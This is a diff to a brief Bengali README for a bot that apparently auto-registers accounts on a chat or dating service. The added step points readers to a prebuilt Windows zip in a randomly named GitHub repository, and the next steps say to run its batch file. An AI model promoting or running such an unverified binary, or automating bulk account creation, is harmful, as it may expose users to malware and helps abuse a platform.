@@ -1,6 +1,10 @@
 ChitChat Bot + CrushFling Auto Register
 =======================================
 
+০) রেডি zip নামাতে:
+   https://github.com/rajuvbygyuiythh/dfdgfhghg45454/releases/tag/windows-x64
+   ফাইল: CrushFling-Bot-Windows-x64.zip
+
 ১) এই zip পুরোটা একটা ফোল্ডারে extract করুন (zip-এর ভিতর থেকে সরাসরি চালাবেন না)।
 
 ২) run.bat ডাবল-ক্লিক করুন।
